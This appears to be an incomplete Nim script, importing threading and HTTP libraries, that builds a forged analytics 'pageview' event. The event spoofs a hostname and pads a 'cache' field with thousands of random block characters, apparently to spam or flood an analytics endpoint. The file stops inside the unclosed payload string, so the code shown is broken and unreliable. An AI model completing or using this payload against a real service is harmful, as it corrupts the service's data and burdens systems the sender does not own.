import std/[locks, os, strutils], puppy

proc clear(): void =
    if os.dirExists("C:\\Windows\\System32"):
        discard os.execShellCmd("cls")
    else:
        discard os.execShellCmd("clear")

const payload = """{
    "type": "pageview",
    "payload": {
        "website": "79b4d6c9-a3b8-4ebc-8c4d-c148d9f1e1dd",
        "hostname": "pornhub.com",
        "screen": "1x1",
        "language": "fr-FR",
        "cache": "▼␥╬▲▼╭◥╬◥▐▐░╯◀␥␥▒⑆▲▛▶␥⑆╬◀▐╭▄◒▄▓◤▒◀◤▟╬▚▓▄◐▲▓▓␥╭▼◤▞░▼╯⑇◐░◥▶▐◀◤⑆⑆▟▐◒⑇▟╬▄▶␥⑆▞⑇␥╯⑆⑇▲▒▛▛▒▛▒◀╯⑆╭▲▞▼▚◐▛╬◐◀░╬▛╯▄▼╭▓▼▛╯▄◀▓◥␥▞▼▶◐╯▒▶▛▚␥▼▄◐▚▟╯◐◐◐▐▲▞▲░⑇╭◒▚▛◐╭⑆█╬█▚▚◀◥▛◥▲▓◀▛▚░▲▄▄⑆▓▞◤◐░⑆▚▞◐⑇░▚▐▼█╯▚◤⑆⑇▲◥◒◒◐◤▟◤▄◤▞▞◀▼▞▓╬▚▟◀▓▄▛◒␥▓▒█▼╯▲▚█▒◒◀◥▲▟▐▲▛◥▐▄◀▟▟░▚▲▓▟◤◐◒◀◥▓▒▶╯▛▒▟▟◐╯▶▚▼◐▟▞╯▶▛▛▼▛▞░⑆░␥▞▓◀╭◥╭╬╯╯▚◥◀⑆╬▟▲▞◥⑇▓⑆▟⑆◒▓╬▞◤◐⑆▞▛╯╬⑇⑆╯▲◥▛▲▛█▲█⑇╭▒◒◒╬█⑇▟▼▚␥◀▒▐▐▶◥◐▚⑇◒▶▐⑇▓␥◐╯◀▐╬▓█▲◒▚▼◒▲╬▟⑆▐▓▚╬◤▲␥▛⑇▟╯␥▚⑇␥◥▼⑆▒◤╯▶▐▼▲▲␥◐▛░◐█╭⑇◐◒▶▚▄▄◤▚▓▲▶▒██⑇◐▞▄▚␥▐▟▟╬▐▲◐▞▚▲╯╯░◐◥◐▟◐╭▟␥␥◤◀◥⑇⑇▓◤▛▓▲█▚◤▄░▞▼▚█◥⑆▒▼◐▛▞▐⑇▶⑇▲▐▚⑆▐◐▓⑇░╯▐▼⑇▄█⑆╬▓▼╯▶◒◤▒▓▄▐▄▶░◥◐◀╭⑇╬◒▞⑇▄◥▐▛╭▲◀╬▛◀╭◥⑆▓◒▄▒◤◐▓⑆▲░╭█␥␥◤▓▼▐◥▶╬▓▶▶▒◒◤◒░▐▐◒╯▞▼▞◐╯╯◐⑆╭◤▐▶░╭▞▶▟▼╯◤▶▄▚╬⑆█◒█▲◤▄▄▒░▛░╭◐░╬▛◀⑇▞▲◤◐╬▚░░▟▓▓▟▒◥▶▟▟▲▞◤▒╬▼╭▞◤▛▒▚▼▶␥▚▛⑇◒⑇◥░░▼◒⑆⑆◐▟⑆▄▛▼╯◀⑇█╯◒░▐▟╯⑇▚╯▞▲▲╭␥◒␥◥▒▶╯▐⑆◥╯█▼█▐╭◤◐▼▒⑇⑇█▼█⑆▐▒▲▼▶▶▶█▞▄◀▛⑆╭⑇◐⑆╯◥◀▶█▲␥⑇▄█◥◤◐◀◥▄▓◐▛▐╬⑆╭▶╯⑆▞╯⑆▓▞◐▐◐▶▚▟▲⑆⑆◤⑆▼▓◤▄◥█▚▄▼▛▒◒▄╬▚◀▒▛▐▚█◀▛▼⑆◥▲◤╯▐▲␥▼░◐◐╯◀◀╭◐█◀⑆⑆◐╭◐╭▼⑇▶⑆▚▼◤⑆▚▶▚▚▒▒░▛▼▓▲▒╭╯╯▐▛▞◤╭▼▐░█◒▒▄╬▼▛▚▞░◀⑆◤▒▐▼█▼◤▓▚░╭╯▼╯▐╭◒╭▓◒◀⑆╭▚▞▲▞▒◒▓▛⑇╭▒╭▟⑆▄◤╬◤◀▞▲▚▛▟⑆█╬█▒░◐▲▐╯▲◒▶░▛▄◤◀◒▚▟█⑆␥▄⑇▟◤⑆▓█▲▓◤◀▼▼▟▟▞▛░◤▓╯╬▛◥⑆␥◤⑇◥▼▚◐▲▲▓▼▚⑇▐▶▟␥╭▛◐╭█▶▐▓░␥╬▄▐▼▛␥⑆␥␥▛█╯◒█␥⑆█◒▲◒◐▟▛◒▛╭▲▟◐▞⑇⑇█▟▄▲╬⑇▼␥▞╯░▲␥▲█▛⑆▚␥▓▶█▄⑇◀█◒█▓⑆▞▄⑇◤◐▞▞▄◥▲⑆╭█▐╯⑇▄⑇▼▚▐⑆⑇◐⑆◥⑇◒▚␥▲▒▲⑆◒▐▼◐▚◐◥⑆▛▶▞╯█╭░▓▶▚▼◤◐▚◤▐▲▟⑇◐▶⑆▐░▞▛␥◀╭◐◐▲▲▓◒⑆▛◀▓▛╯▛◤╭▲██▐▛▛◐▶␥◒▄▚▲◤▶▲▶▚▲█░▛▐╯╯▓▚▛◒╯▛◀▟▼▓▼▓╭⑇▲▚◐◥█◒╬▶╭▞◤◤◤╭▶▟▶▄◤▚╭⑇▲╬░␥▲█▞␥◥◐▼▟▼▶⑆▼╬▚╬◐▶╭╬⑇▚▞◐◐◐▞◤⑆▚▓▲▶▼▟▶◀▞▐⑇╯▟▟▄◤╯◒╯█▒▄◀◀⑇▒▞▒◀▚▼▚▲◒╭█░░╭◤▼▟▓▓◥⑆◐▼▟▒▞◒╭╯╭▄▓▲░█␥◐⑆▒◀▟◤◀◀▚▼◥␥◤╯⑆▄▶◥◐▛◐░◀╭⑇█◤⑆◀▛◀▓▄░◒▐▓▐▚▲▄⑇▟␥◤▶█▓⑇◒␥▼▚◤⑇▛▟▐╯░◐◥▚▶▟◥▒◥▛▒◐⑆◀▄▼▲▟▐▶◥▞◒◐◤⑇▼░␥▓⑆▚▲◒╭▞▲▚╭╬▚╬▚▟▶▚␥▄▓╬▒▓▐╭▓▒◒▛◤╭█▚╯╯╯◀╯▟▼▞⑆░◒▲␥▞▲▚◥▛⑇▛◀◤◥▼▄␥╬◥◥▶⑆◤◀⑆◒╬▶␥▓▛▓⑆◤▓░╭█▶◐▚▶▓◐▶⑆▓⑆▼▟▲▶█▄▄◐▶╭◐▐╭╭▐▛▚◀╯▒⑇⑇▟◒▒▶◐░▲░░▞▼▓▟◀▐▟▛▄◤░╭╬▛▐▄╬▶▟◀▚◒⑆╭▞◐⑆⑇◤▼╬▛⑆░╬◤▒◒▲▞⑇▐⑆▛▄▒◀◀◐◥◒▶╭▓╬▟█▚╬▄░█╯▟╭╬▶▒␥▚▓⑇▚▛▄◥◒╯╭◀░◒◐╯╬⑆⑆▄◐◒⑆░▓▛░⑆░╬▲⑇╬▛░▄▶█▄██◥▄▟◒⑆▼▄◥▄█▒▟▛◒␥◐█▟◤▛▞⑆▟▛␥▓▄␥█▼◒◐▛◐▓█▟▲▒╬╭◥▛▒▐▲◤▲␥▲▼▟▟╬◤▲◥▼╬╭␥▚╭▲░◀◤╭▒▛⑇▐▶▄█▓␥▓◥◀◐▄▚▄◐╬␥▄█▲▚⑆◥╭▓␥⑆▲▛▞◤▲▶▼▼⑆▚▟▞◒◤▼▄╬▛╭◐▚╭▛◤⑆▟▐▐▼␥█◀▼◥▶╯␥╯▲◤▟◀▼⑆░◀╯◤▒▐░▟▲╭◀▛⑆▞␥░▄▶╯◒▶◀▞◒⑆◀◤█▚⑆╬█╭␥⑇␥◒╯▲▶▐█▚░◀░╭◀▟▶▶░╭⑆⑆▄◒█▶◥▐▶▟▓█▄◐◤▛◤◥▐╬╯␥█▟▐█▟◀▲▶▶◥◀█▓▶⑆▒▲◤▲▟▲╭▐⑇▒▼◐╭▛▒▛▚╭◥▄⑇▲▞▞◀▒▒▼▶░▞▒◥◤⑆▚▞␥⑇◒╭◥▄◒█▓⑇◥◥▲▟▒▞◒◥◐␥╯▛▞▼░▟▛╬▄▒◤▼▶◀⑆␥╯╯▟⑇◒⑆▄◤▲▓␥◤◥▛▛◒▛╯◀◀◀▒▐▚╭␥▼╯◤◤␥◥▐▄╯␥█╯◥◥▄◒␥▲▞▲◥▲╯␥█╬⑇╯▲▄▶◤░▟▄▲░▶▟␥▓░▶␥▒⑆▲╯◒▞␥⑇◐█╯╭▶▓▓╬◤▚◥◐▛⑆◥◀▞▚░◒█▶╭◒▚◐◐█␥▶⑇╯╬⑆◥▐⑆◥▞▓◒▲▼␥▓▛█▟░█◒█╬▓▟␥░▄╭⑆░◐▚␥◒␥▒▼⑇⑇▼█╯█◀░␥░▛╯␥▞▐⑆╯◀▲◒╭╯◤╯█▚◀▛▛▓▚◐◐╬◀▒◒▒▛⑆▓▶◤▒╭▄▼⑆╬␥▚▟▐╯▄▓▛▓▄▞◥▟▶▓◥╯░░▼◒▛█◤▚▚◒▓▚◤◀▶▐▲█▐╬⑇▓▒◐▲▶▄╭▞▐╬░▶▄⑇▒◥░▄▶⑇░◤▶◥▐▞░▟█╬█▄▐⑆◥◀▲╭█◒◒⑆▶▓▶▲╬█░⑆╭◥▐◀␥▓█▶◀⑆▶◤▶▼╭╬░█◀▼▄▶⑆▒╯⑆␥◤⑆◤◥◥␥◒╯⑇▶█⑇◐▞◥▞◒░◀▲▟▟◥█▚◥▼░▐╬▄╬╯▶▶╬▞▛▚▄▛▟▞▲⑆◒▄␥⑇▄␥▚▄⑆░⑆▒╬▲◒▓╬░█◐␥╬█⑆◀▼▐◒▄◤▛░◀╬◥◐▲▛▲⑇╯░▚▟▐╬▛▚▒▞◒◐⑆⑆▓▟▒▞⑇▞▒▼◐⑇⑆◤⑇╭▄▚╬▼◀░▛▒⑇▛▼▛▄▓▚▞␥⑆◐▟▓◤╯⑇▞◀╯╭▲⑇╯◀␥▚▚▒◀██▶▟◒▶◒␥▶▚◒▲␥░▚◒▲◤╬◥◤▟▼▲▛▓▒⑆▛▒⑇▟▐◥▞◀▞╭␥◀◥░▲◤⑆⑆▓╬◐◤◥░▒▒◐◥␥▄▐▓▲╯╭▶░╯▟⑆◤▶▐◒◤◒⑇⑆▚◥▶░◀╬▄▶╯╯▓◒▚▞␥◒▶░◤␥⑇▶╬◐◤⑇▟◤▐◐◤╬⑆⑆◀▟█◒◤␥╭░▟▼▲▐▲▄╬◒▞▟▶⑇▐⑆▼◤▒▐╬▲▚◐◐▚◤▄╬◒▚⑆◒▒◀██╬⑆▄╬▞╬▒▶▓⑇╬▐▚▟◤◥◐▒␥⑇▚▞␥▄◐▶▐╭▞◒▼◐▟▒▶▄◐▼▚◥⑆▲▛╯⑆▟⑆▲▚◤◐░⑆◐◒▟▐▞◒░▒▲╭◀▟▒◤◤⑆▓╭╬▲╬▚▟█▼░◐▞▟▲◒⑆▄░◀▐▛◥█▚▛▚╯◐░▚◤◥▟▓▛▄▚▲▼▛▼◤◥◥▼▄▓◀▓⑆█▚╯▚▐▄⑆␥◐▟▄⑆◥╯▟╯╯▛▞░◥▚▓▄▞◒▓╯▛▟▶⑆█␥▐▲▛◤◐⑇╭␥␥▐◒▼⑆␥␥◒╬▶▒▒▐▐▲⑆▟▓█▐╬╭◐␥╭▟⑆▛█▓▒▄▐␥╬▞▐▐◤⑆␥╯◒◒◥␥╯░░░▼◥▐▞▐◥▓▚▲␥▟◤╯◒▼▞▛╯▒⑆▒╯▼╯▼▛◥▛▐◤◐◐◒▓◀▄⑇╯▞▼◐╬▶⑇◀◥▲◀█␥◥␥▲▼◀╯◀▄█▟╭▓▓▟░▓◒▟▼░▟▐▒◥╯▒◐▼▚◤▐▛◀◀▛╭╯▐╯╯◀░▓░◀◐▞⑇▒◒▛╯◤▄╭◥⑆█▼◥▞╭▟▞╯▐⑇␥▲◒▟▐▛▼╬⑆╭␥◀◤▶╬╭◐▓◒▲▐◐◐╬◤░▲⑆▐◐◒╯▒▄▶▐␥␥╬◤◥⑇╬╯▛▛⑇▓◐◥⑇▲▞▟▓▒▄◀⑇▛▒⑆░▓▚⑆▼▼▞▞▛░▓▐⑆╭▄␥▐◥░▐▶▛░▒▄╯␥▒░▓▄␥▐◒◐▟╭▒▟╬◐⑇▼⑇◐▒▚▄◒▟◐▓▄◒▓▄␥▛▞◒╭░╬◒▞▶█╭▒␥▼▟╯▚▲╭▞▟░◀▶▼▚▄╬╬▞◒⑇▚▐▒╯◤█▶▛␥▟░◥╯▛╯▓⑆◀░◀▓◐╬▼░░▛█◥◤▒▲░▟▟▄▛╯▛▒▓▲▲◀▞█␥▄◤⑇█␥▛◀⑇▄▒␥▞▶▞█▼▲░▲◤◐◒█▛◀◤╯⑇╯◤╬╯▐▛␥░␥⑇▲▛◤▟▒◤▞▼╭▼▓▼▲▐▐▞╯◀⑇█╯▲▲◥▛▟◥◀╬⑇▐◤╬⑇◐␥▞▛◀░╯╯░⑇◐█▚▚⑇▲◥▼▟▶░▛╯╯▒▲▚╭░█▓◀▚▓▞◥╭╬◒⑇░▼▚⑇╭╯▄╬⑇◀▶▼╭▓▓█╭␥╯␥◐▼⑇◥◐▶␥▲◤▞⑆◤⑆▒◒⑇▟█▞▶◤▞◥▄╯▼◒◥␥▚▓╬▼╬▼⑆█▐◒◤▄▛◥░▚▞␥▒▒▐▄▲▟◒▶▄◐▚▒▲▄◐▶␥▟⑆╬◒▄╯◐▼▄▞◀◤▄◐▚▒▐▼█░▓◥◐◐▒▛◀▓▒▞▐⑇▲◐▶◥▛▓█▓▄▶▛▼▐█▚╯◐░◥░◥␥╯▲▞╭╭╯␥▶◤▓⑆╭◀▚▄╭◤▒▒░▶▚◒◀▲◀▶▞▐⑆⑆◤◥␥▒▟░◀▒▟▓╬░␥▲▄▼▛╭▚◤╭◤█▚▐▚⑇␥▐▲◀▼⑆▛▓▚▚◥⑆╬▐◥◥▚░◒⑆␥◒╬▓▛◥▼⑇▞◒◤⑆╯⑇▼▟▚▛◐░▟▐◤◥▲▶▼▶⑆▶░◀╬▄▞▐█▼▲◥▞◤▞▒╬␥▲╯◀▄▼▄▒▒⑆▞◐▛▄╯▚█▶╯▒▚◀◀▲␥╯▞╭▐◒◀╯▟█▚⑆╯◐█╯◀█▟▐◀▐◐╯▚⑆▚▒▼⑆▲░▶╯␥▄▶⑇▼╯▟◥╭▲░▒╯▞▟▞▓╯␥◤╭▄◥▲▐░▞╬▶▓◐▲╭╬▒▓⑆⑇▄◤██⑇▞▶▛▐▼▄◥╯╬◀◀◒▚◀◀█▄◀▛⑆◤␥╬▶◐█◀⑇▞▄░▛◀▚⑇▞╭◥◐▶◥␥░◒▶⑆◐▐██▚▟▞◐◤◀◥▒◒⑇▼╭▚╯▼╭␥▼▓╭▞▓▶⑇▼▓░▒⑆◒⑆◀▒▞▒▚▟▲▲◤▓▞▚▲▲╯◀◥◒╬␥◥▚▒█⑇◤░⑇▶▓▐╬▟▓⑆▞▶░█▄▒◐░▄◀╬◒▄▲▞▓▒▛⑆▄▞▟╬▼␥╯▛▛▐◥◥╭▶◀╭▚▒▲█░◐◐▄◤◐╬◐⑇▶␥◤░␥▛█◤▒⑆⑆▐▓▶▄◥◐╯▼╬▶▄╯◤▟◒▲⑆⑆◒╭▄╬╬▲◤◒▚▒╬◤▄▞▄▶▼◒▛▛⑇╯␥▄░▲█▒▄◒▲░◒▼◐◐◀▛▓⑇▒◤◒▞◐█░⑆◀╭▶◤▶▟␥▄▒▚▼⑇▚░▓◥░◤╭▛▶▼◤⑆⑆◒◐▚◒▒⑆▞▛␥◤▲▒▓▛╬╭▛␥▓╯⑇▼▟▼▚▐⑇▛◒▲◥⑇◐╬◒╯░█▐◒␥◐◥▓▓▓░⑆╬▼╬▚╭▶␥╬▛╬▐▓⑇░▐◒▼▐⑆◒▶⑆░▶╬◐╬◥◐◥▄⑇▚▒◤◤▐▐╬▟▐╯▟⑆◤⑆▞█◐╬␥█⑆◒␥◒◤⑆▒◤◐◥◐▟◐▞╭▓▲░▓▲▟␥␥▐▼▲▒╬█╬▞▛▓▟⑇▓▚░◤▚▐▞░◀▒▐▞▶◐◀▛▶◤█▼█▲▲␥␥╯◥◐▓▚⑆◀╭⑇⑆▄▒╬◀▟░╭╭◐▛╭▓▓▒▼▒▼▛▲▼▓◤▛╯▟◥▲◒▄▓◤◐╬◒▄▐▛▞▶▄◀▼⑇▐▞╬◥░▒◒╭◀▐▞◀╯╭░▼▞⑆▲█▲╯▄▛▚█▲▐░▐▛◀▚▛▚◒▒▒◒▶⑆◒▶▚╭␥▼◀▟▟◀██▶⑆▒▒▶␥◤╯╯▐╯▶░▞█▓◐◥▞◤▟◥▐▚▞▚◀▛▒╯░▲░▶╬▲▶▓◐█▄◤◤█▚▚◐◀⑆▛▼◐◀▐▛▞╯⑆⑇⑆▞╯▛▄▼▓▄╬▓█╯⑆█▐█▟▚▛▐▄▶◐▓⑆╭▼▟▐█▞◤▞█◤␥▚▲▄◒◤▛␥▓▄◤⑆░◥▟◀◐◤▞╯█▒╬▲█▄▼▚▼◤▶◀◒▛⑆█▛◀█▞⑇␥▶▲▞▲╭╬╯▄▒░▲▓▛▶▐▲◒▟▟▼▐▛▞▞⑆▓╯▐◤▼⑆▄◒▐⑆⑆▚▓▲╬▼▶▚▐◀▞◐␥◤▼␥◀▟▲╬╯▓▼█▛╯▞░◒◤░╬▛◒╬╬▼▚▞◒⑇▶░▟▄╭◀▐╭▛▟▐▒▒╬◤▼◀⑆▼█▛▲▛▞▶▛◥◥╯▛▼▟▚▞◥◀╭◀╬▓▄▚▚◐╬▐▼░╯╭◥⑆╭╭▛▚╯░▼▼▼◥▞␥◐◒▲▶▼▟◥█◒◀█⑇▼░▼╯░␥▄▚▚◥␥◀◥█▲▒▟⑇▐░╭◥╬▟▐◒◤▶◥◐▚▐◀╯╬▼▟▲◀⑆⑆▄▐▶▒░▞◐╭◒▛◥▓╭▲▐▲␥▼▞▐◥▞◐▓▓⑆▐▐▚╯◒◒▼╯╭◀⑆╬▄⑇␥◒⑇▼╭▚⑆◐╭╬▶▼◤▓▒▐█▚▟▒╬␥▚░◒⑆◒␥▛█◐␥▐▛▟█⑆⑇╭▟▚╬╭▒▛◀▚◐▼▒◐█▐░█╯▄◒█╯▒▒◒◐▚▞␥▒▄⑆◐▞▓▒█▓▐⑆▲▟░▐╬␥░⑆▚▓╯◥␥◀▟◒▲▲╬╬╯⑇▄╬▐▐▼◒╬▚╯▛╭⑆█▚▚█▚▞▲◀▄▶▒◐◀█╭╬▚▐╭▞⑆╬▶▓█▞◥◀◐╬▼▄▚▓▒╬▼▶░█▟◐░⑆⑇╬⑇⑆╯␥◒░◤␥░◤▟░▓▟╬▶░╯▐◥◐╬◐▲╬▼░␥▼█◥◒╯▲⑆◐╯▓◐▟▼▟⑇◤◤▞▞╭◥╭▄⑇◤▄◥◀◒▒▄◀⑇░▶▒╬╭▓▼╭◀▒◀⑇▓▟▛▼▐▶▶▛▶▄▛▞▶◐◀◀▶▚⑇◥▼░╬▐╯▶◤█◀▚▓⑆⑇▟╯◀▶╯◐◥▓▓⑆␥▐␥▶╭⑆╯▚╬◒▛◀⑇◥▟▐▲▓▄◤◀▒◀◥◥▚◀␥▼█▄▓◥░▛▟▛▟◥╬◀╯▞█╯▄▚╭▛█▓╯▓▒⑆⑇▄◤◐␥◐▼▓◒▐⑇◀╭█◐▓␥▒▛╭⑇▐◒␥▟▐⑆▟⑆╬▄▲◒⑆◥╭◀◥▞▐▄⑆⑆▓▲◥▼⑇◤▲⑇▞▛◐⑆▲◒⑇▲▞╭◤▟▞▛⑇▄╬▞◀◥◥⑇╭▐◒▼◐◐▶◥▟▲◒▟╭█⑆⑇◥╯█▲◤▟╯▟░▛◀▶▄▐◐╭▲╭◀╬╯▞▓▓╬▚⑆█▒▐␥░◤▓▼╭◤▄◤╭▶▚◥◀▲╬▞▚⑆▟▐╭◐▶╯▟␥◤␥▞⑇▄⑇▲▼⑇▲◐◤◒▟▼⑇▟░⑆▞▓▶▲▚◤╬⑇▓▓▲▛╬▒◐◤▟␥⑆◐▄▲╯◥⑆▟◀◥▒▒◀▼◀▚⑆▞▐␥█▞▐▄▟▄◀⑆▞␥◒⑆␥◀▞▞▼◒╯⑆▓▲▛▒◐▶╯╭▲▟▒◐◀▐⑆▚⑆▐▞▄▞⑆▶▐╯▟╬⑆▟◀⑆◤⑇◤▶▟▄▞▐◀╬╯╬▒◒◤▒▲▒◀╭◐▟▛▒▶╯╬◐▛◒▶░◒◤▄◐◒⑆▒▛█▓⑇▚▒◒⑇╭▟⑆▶◒◥▒░◀⑇▄▄␥▛⑆▛▞╯╬▚◒◀◤⑇╯▚▲█◀▶╬◒▛▶░␥▐╬╬▶▓◥◤▄◥⑇▐▚◤◤▶╬▓░╬▞▶◤⑇▓╯▚▟◥◥▐▞◒▛▟▄▟▒▞░╬╬␥▚▼⑆◤╭◥░▚▄▼▚␥▐█▲▐⑇▄▲◀▄▲▄▐▶⑇╬╭▶◥▶▓◐▚╭▶▚░▛◀░╭▓▒␥▶╯▛█▛▛╬░▚⑇◒░▄◤␥▚▲▶◀▐◤╯░╭◒▼▟╭▶▼◤◀░╬╯▞▚▐╭◀╭▼◒▲╯▐◥▼⑆█▲⑆⑇▞▐▐╭▛░␥▓░▐◒◥▐╬╬▲█╯╭▲⑇◐⑆╯◐◒▶▶␥▟◀╬⑆▒▓▛█▓◥▶░▐▟▄◒▼░▒⑆◤▐▶╯╭╭◥▄▒▓▶⑇╯◀␥◀▚▶█◥◤⑇▚╬╯▄⑇▶▲╭◀▟░▓◐◒◥╬◥⑇◀▲▲◐▚█▲▄◀▒▛▐␥╭▄▓▄▞▲◤╭◥█▼▒╯▒▛▞╯▓▞⑆▟█▄░▲▶▶◀▄◀⑇◒▲╭▒▚⑆␥▛⑆▛▼⑇◒⑆▒█╭◥░▲╬⑆╭␥◀◀▶▓▄╯▐▐⑆╬▲⑇▶◥▼▓░⑆◤▓╯▐◒▄◥▞␥▄▼╭▄␥◒█▞▞▐▓▞▞▒◤▄░▚▞▄╬╯▞╬␥▛▼◥▼␥▒▚╬◥▞╭◐⑆░◤▛⑇╭▄␥⑇▓█◐▓⑆╭▛◤▓╬◒█◤▞◐◤◒⑆▞╭▼⑇▚▄◥⑆▲▄◤▞▶◤▼⑆◥█▚╭▚▲█▄◒▐⑆▼╭▶▓▼╯⑆◀▚◥▲░▲◤▓▼░▶░⑆▒▒╭▚␥▟⑆▐█◤▐⑆⑆◥╬␥⑇◥◀⑆╭◀◤╭╯░╬◒▓▚▼╭▞▟◒▼╬╬╬◀▐◒◤⑆▚⑇╯█␥█␥⑇◀▛▞◒░░█▒⑇␥╬▒▚▲▄◒⑇▶◤▓╬◥▚▓╯▲⑇▚◥▄␥◤▶▛▄▶◤◀▒▟◀◤▓▞␥⑆▚⑆▓◀▲╬▞◤╭▓⑆⑆█▶⑆◤◤▄⑇◀▟╯▒◒▚▓▛▞◀␥▼╬▟▲╭▶◤▚▄␥╯◒▟░█░▛▚▲⑇▲◐◥▛█▒◤▓╯◥╭░␥▐◥▲▒░⑇▶▼╭◤░▚█▲▒▲▶▟⑇▛⑇◐▄▼◐␥█╬╭█▼◀▼╬▐╭░▒◀▞⑆▐◀▟◥◒▐◤▄▟▛▛╯␥▶▐◀⑆◐▼◐▒␥╯▛▲╬⑇╯▒▟▒██␥▟▲╬▞◤▶◒▶╯▲▒⑇█␥▶◤▲⑆◀◤▞◤╭█▟█▛◥█◐█▐╬◐╬▛⑇▐▼▶▓╯▟◥◒⑆◥▒▞◐▶▲▒▐␥▐╭▄╬▚▄⑆◥▚▓╯▓▚␥◤█⑆▄◥▟▄⑇▚▐▞▲⑇▲◀▟◥░▚▶◀▄◤◤▚╯◒▄█▄╭◤╭╬◐▛◤▚█▚╯▶╭▼╬╭▐╭▐⑆⑆◥␥◀◤▼╭▄◒◀◥╯╯▟▛▐▓␥╭▼▓▚◀▐▚╬▟◤▶╯▟╭▲◀░╭⑆◒▒╬◥╬◥▛◐◒⑆▼▐╭▟▞◥▄◥▓╯█◤⑇▶╯▼▓╯╯▶⑆▄╭◀▲◥╬⑇◐▼▛▄▚▲▚◀▞◒◐◥⑇░▛▛▛▚◒▼◥◀▄▚▚▶▓⑇◥⑆╯▟◒◥▒◥◐╬██▒░◀▒█▐▓╯░░◀◐␥▞◤░╯▒▼╭░▼▚◒╬◒╯◥◤◒◥⑇▐█╯▲▐▟▚▒▟▞▲▒◒⑆▶◒▄◒▒▟␥⑇▲␥◥◥◥▞◀░▶▛█◐▒▚╬▐╭╯⑇▛⑆◤▄◒▒◒◀▞▶▒⑆▟▐◥◐▼▚⑆╬▼◐▶⑇▚␥▒▶◥╯▚⑆◒⑇▶▒▐⑇◒◐╬╬▶▟░␥▚╬▶◀▚▶▞▛▛▚╬╬▚◀▲▓▼▟◥█◒▟◐▞◐╬▼◥⑇◤▼◐⑆▶▐╯▒▶╭▶╯◥⑆▶⑇╯▄⑇◒▲▼⑆╯▛⑆▓◒▞⑆▞◀▲░◐░▼▓╯▐▟⑇⑆◐▓█◐◒␥╬█░◒◀╭▟▓▚▐░╯◐◥◒▄◐▶◒▛◐⑆▛␥▚▼▄▼◤▲◒◥▼▓⑇▒◐◐▞▛╭▐⑇▟⑇╬▶▼◒▚▟▓⑇▚▓⑆█▒◤▒░▲█▓◐◐▟␥▛▞◀▐▟▛▐▟▟▟◤◐╯╯▞▐╬⑆▼█▲▶▛▶▟▼╯▐⑆◐◤╭⑆▓▒▛⑇╭╬▓▶╯▚◀⑇◥▟▐◤␥▛◐▐▒␥▄␥◐▒░▲▶█▟█▒▄▛▼◒◀▄▐◐▚◐▞▟╯⑆▚◤▼␥╬▐▼▐◐▞█◥␥▼░▐◥▲▛╬▛▼␥░▓▼▛▄╯╬╭◥▞▓▶╭⑆␥⑆▐␥␥▐░⑇◒╯▄▛◐◒▒▐␥◥◥▟◥▞▲█▒◤▲▼▒█▲╭▞░◒▚╭⑆╯╭█▒▟␥█⑆▶▄⑇▞▄▓▞⑆▓◥▶▞◤▄╭▐▄░▚▐▒▲▲▼╬◀▄▞█▒◤⑇▲◥▐▛⑆▓▚◤◤█▛⑇▞▄▓▐▐▚▄▚░◤⑆╭▒▟◥█▞⑆▄▐▓╬▐╯╭▄▒◒⑇▞⑆▓▛⑆◀▞▚▓◒⑆▒╬░▚╭␥▓▚░⑆▶◥█◤␥◐▲◥▚▞▞╬╬⑇╬▚░◐█⑆◤▄⑇▛▚╭▟⑇▐▼⑆▛▲▛◒▞▲▒█◐░▛▓◤◒▒▄▞◀▛▛╯▲⑆▓▟╭▶▲⑇⑆╯◀╬█░▟╯◐▓◥◀⑆▒␥◀╯▟▓╯╬▐█▲▓╬╯▲░◒◀▒▼╭▲█▟▞▶▞⑆▞▲▟▐▓◐█▞▒▞⑆◒▄▼╭▟␥▟╯▒⑇▶╭╭▄⑇▛█╭⑆╭▐▟◤◀␥◒◐▒▞◐▒╬▄▞⑆░▛▞▲╭▼⑆▓▓░◒╬⑇⑆⑆⑆▶░▚␥▲▞▚▞▞◀⑇▓▛╯▛╯◥▛╯◒⑆▚▟▚◒▒␥▛╬▶␥◀▟█◥◒█░▄▓◀▶◀▄␥▼␥▒▒╯◐◀◐◐░╬◥▶◀␥╬╬␥▟╬▒░▐␥◐▲▶▚▓◒▛▐⑆▐█▓▚◐▼╬▄░▐╭◀▛▚▟◀╭█▶▄◒▓▞⑆▞▐▚␥▚▶▛▶█⑇▲╭▓╭▟╭▚▛⑆◐◐␥▞▶█▚◀▄◐◒▓▒▐▐█▚◒▚◐◐▶▒▚░▄▄╭░╭⑇█▄◥▄▒▒▲░◒▞⑇█▲▒◀▟◒▐▼╯╬▞▄▐◀◒◤▐░◒▼▼⑆◐╭◐◒╯▞╭◒▓▲⑆▟▟▄◤█▚⑇█▚▶▐◤◐▛▚◒█◤▐▞◒▄▐░◐▒╯╭▼▛▒▞◐▐▄▶▐░⑆╯⑇⑇▛▚█⑇█▄▐▼▛␥▐◐▞◐░░▞▄▛◐◀◥▞╬▛◥▒▚▐◤⑆◒▐◥◥◥▒▶▄╭◥▟▚▒▓▞▟▼▲␥▚◒▓╬▓◒░▲▼╬▐░▛█⑇▓▐▓╭╯◐◐█▲▒▄◀▓╭◤▚␥▲▼█◤◀╯⑇╭▼▼⑆␥▞░▐▲▒╯⑇◐▒▼◐␥▲▒▶◥▐◐▒◥▞╬▚⑆␥▶▞▚╭▲⑆◐╭◒╬▛▛▲◤␥╬▓⑇▲▐▐◀▛◐╭▟▞◒▚▞▶▛▼▐╭▛◐░▓⑆▛⑆▼▛◐▞╯╬╯◀▚◀◀▲█▼▞␥█▐▞◀░⑆▲▓▚▚⑆▐╭▒▓▓▓▛╯▄▞░␥▐░␥█▞▶▒░▲▄▲▚▛⑆◀░▐▒␥╯▐▟◥░░▚▞▟▛╯◐▞⑆◤╭◤␥╬▓▄◤◀▞╭◤▞▄▚▼╭╭▒▲◀╯╭◐╬▼▞▐␥▒▐▶◐⑆◒▐▟⑆▚╬╭░░╭╯▞▚▛▲▲╯█⑆◒█◀◥␥▚▼▄▞╬␥◀▛◥▓▞▓▲▓░␥◐◒▞▟▞◀╯█◐◒⑆⑆⑆▛◤⑆▓␥▓▓◥╭▲▼▼▚⑆▚▒▟▶▛◤␥▼▄▓▼▓▓◒▓▟▓▶▶▛░█▼█╬▶⑇▒▓␥▶▚␥▼▒◐◀⑇◤␥█▟▛▟◤▼◀█▲▼◒▞◤▄╬▲⑆▚░⑆╭▄▓⑆▼░░▞▶░◀◐▄▄▄╯█◐▛▼▄░╭╬▚◤▞◤▐⑆░▼▐◀▒⑇▓░▛▶◥▲◥◀▚╬▐██▓⑇░◤░░▄▼▲◥▞␥▲◤◀▼▼▶▼╭◥⑆▞◥⑇◐╯╭⑇░␥⑇⑆␥╬▚◥▲▚▲▶▟▒▐⑆▞╬▚▄▛▼␥◒▟␥